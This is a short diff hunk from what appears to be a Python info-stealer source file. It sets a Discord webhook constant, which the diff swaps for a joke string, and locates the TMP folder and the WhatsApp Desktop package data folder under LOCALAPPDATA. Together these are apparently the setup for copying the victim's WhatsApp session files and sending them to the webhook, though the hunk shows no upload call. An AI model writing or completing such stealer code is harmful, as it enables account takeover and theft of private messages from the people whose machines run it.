@@ -2,7 +2,7 @@ import os, requests, time, socket, shutil
 
 # PSG > OM
 
-WEBHOOK = "https://discord.com/api/webhooks/id/key"
+WEBHOOK = "xpierroz on top"
 
 temp = os.environ.get('TMP') or os.environ.get('TEMP')
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
